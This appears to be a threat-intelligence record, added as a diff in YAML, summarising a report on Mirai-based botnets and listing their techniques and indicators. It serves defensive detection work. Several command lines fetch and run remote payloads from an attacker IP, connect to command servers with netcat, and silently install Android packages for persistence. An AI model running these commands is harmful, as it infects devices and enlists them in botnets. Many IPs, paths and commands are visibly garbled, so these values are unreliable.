@@ -1,0 +1,93 @@
+description: The report discusses various Mirai-based botnets including Satori, Aisuru-Kimwolf,
+  and KimWolf. It provides technical details on their operations, including scripts
+  used for infection and C2 communications.
+malware_families:
+- Satori
+- Aisuru-Kimwolf
+- KimWolf
+TTPs:
+  processes:
+  - busybox
+  - wget
+  - sh
+  - pm
+  - toybox
+  - nc
+  commandline:
+  - multilingual show;#{cmd}
+  - wget http://185.62.190.191/r -O -X /tmp/r; sh /tmp/r$
+  - wget bttp://Shttp_server/$i -0 -> $na
+  - chmod 777 $na
+  - pm uninstall $1
+  - busybox wget http://$http_server/l -0 > .b
+  - chmod 777 b/b
+  - ./b
+  - install armed.bot.le
+  - install arm?.bot.le
+  - install mips.bot.be
+  - install mipsel.bot.le
+  - install 1686.bot.le
+  - install x86_64.bot.le
+  - pm uninstall com.ufo.miner
+  - rm minerdm ufo.apkm xigm xig.log
+  - rm endatm locko. txt
+  - rm nobup
+  - $0
+  powershell: []
+  scripting_engine:
+  - /system/bin/sh
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - busybox->185.62.190.191:80
+  - toybox nc $3[.]951.:5082
+  - toybox nc $3[.]95(.12121.153:8082
+  - toybox nc 93[.195(.1112[.]33:5039
+  - toybox nc S3[.ISS[.1112[.]153:5095
+  - toybox nc 83(.)95(.1112[.]133:5039
+  - toybox nc S51.195(.1112[.]153:3552
+  - toybox nc S51.195(.1112[.]153:3582
+  file_activity:
+  - /tmp/r
+  - .b
+  - $na
+  - /data/local/vmp/mreoll.apk
+  - /data/local/cmp/mreslle
+  - /data/local/cmp/mreciz
+  - /data/local/cmp/mecnST.apk
+  persistence:
+  - pm install -g SSAVE_DIR/meowST.apk
+  - pm install x -g SSAVE_DIR/mecus?.apk
+  - pm install z g SSAVE_DIR/mreoil.apk
+  - pm install x SSAVE_DIR/mecws?.apk
+  - pm install g $SAVELDIR/mreoil.apk
+  - pm install sanve pri/meovs. apk
+  - pm install SSAVE_DIR/mreoll.apk
+  - pm install -g $SAVE_DIR/mreoll.apk
+  - start-foreground-service -n com.n2.systenservice063/.NecworkSynoService
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 185.62.190.191
+  - 68.183.12.189
+  - 134.122.61.86
+  - 142.93.224.228
+  - 157.245.65.155
+  - 159.223.229.103
+  - 164.92.218.26
+  - 164.92.219.102
+  - 165.22.203.183
+  - 167.71.69.201
+  - 178.62.213.245
+  - 188.166.113.161
+  domains:
+  - zachebt[.]meowmeowmeowmeowmeow[.]meow[.]indiahackgod[.]su
+  - lolbrogg123424[.]com
+  - fuckzachebt[.]me
+  - chachasli[.]de
+  urls:
+  - http://185.62.190.191/r
+reference: https://blog.pulsedive.com/the-operations-of-the-swarm-inside-the-complex-world-of-mirai-based-botnets/
+date_of_publication: March 24, 2026
+file_creation_date: March 27, 2026
